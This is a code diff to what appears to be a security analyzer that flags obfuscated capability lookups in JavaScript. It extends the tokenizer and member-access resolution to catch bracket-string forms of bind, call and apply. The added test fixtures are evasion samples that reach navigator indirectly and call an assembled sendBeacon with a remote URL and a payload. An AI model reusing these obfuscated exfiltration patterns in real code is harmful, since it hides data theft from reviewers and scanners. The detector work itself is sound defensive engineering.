@@ -628,12 +628,16 @@ function javascriptStructuralTokens(content) {
     }
     if (["'", '"', "`"].includes(character)) {
       const quote = character;
+      let literal = "";
+      let isStatic = quote !== "`";
       index += 1;
       while (index < content.length) {
-        if (content[index] === "\\") { index += 2; continue; }
+        if (content[index] === "\\") { isStatic = false; index += 2; continue; }
         if (content[index] === quote) { index += 1; break; }
+        literal += content[index];
         index += 1;
       }
+      if (isStatic) tokens.push({ type: "string", value: literal });
       continue;
     }
     if (/[A-Za-z_$]/.test(character)) {
@@ -764,9 +768,21 @@ function hasAliasedComputedCapabilityLookup(content) {
           }
           return depth === 0 ? closing : null;
         };
-        const memberIndexAt = (index) => {
-          if (tokens[index]?.value === ".") return index + 1;
-          if (tokens[index]?.value === "?" && tokens[index + 1]?.value === ".") return index + 2;
+        const memberAt = (index) => {
+          if (tokens[index]?.value === ".") {
+            return { name: tokens[index + 1]?.value, after: index + 2 };
+          }
+          if (tokens[index]?.value === "[" && tokens[index + 1]?.type === "string"
+            && tokens[index + 2]?.value === "]") {
+            return { name: tokens[index + 1].value, after: index + 3 };
+          }
+          if (tokens[index]?.value === "?" && tokens[index + 1]?.value === ".") {
+            if (tokens[index + 2]?.value === "[" && tokens[index + 3]?.type === "string"
+              && tokens[index + 4]?.value === "]") {
+              return { name: tokens[index + 3].value, after: index + 5 };
+            }
+            return { name: tokens[index + 2]?.value, after: index + 3 };
+          }
           return null;
         };
         const executesFunctionAt = (index) => {
@@ -774,11 +790,11 @@ function hasAliasedComputedCapabilityLookup(content) {
           while (execution < endExclusive) {
             while (tokens[execution]?.value === "!") execution += 1;
             if (isInvocationAt(execution)) return true;
-            const member = memberIndexAt(execution);
+            const member = memberAt(execution);
             if (member === null) return false;
-            if (["call", "apply"].includes(tokens[member]?.value)) return isInvocationAt(member + 1);
-            if (tokens[member]?.value !== "bind") return false;
-            const afterBind = afterInvocationAt(member + 1);
+            if (["call", "apply"].includes(member.name)) return isInvocationAt(member.after);
+            if (member.name !== "bind") return false;
+            const afterBind = afterInvocationAt(member.after);
             if (afterBind === null || afterBind <= execution) return false;
             execution = afterBind;
           }
@@ -1372,6 +1388,11 @@ for (const fixture of [
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source).call(null).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source).apply(null, []).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source)!.call(null).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator["bind"](Source)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator?.["bind"](Source)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source)["call"](null).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source)["apply"](null, []).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
+  { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator["bi" + "nd"](Source)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(Source).bind(null)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null).bind(null)().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'class Source { static *getNavigator<T>(): Generator<any, any, any> { yield navigator; } } const nav = Source.getNavigator.bind?.(Source)?.call?.(null).next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
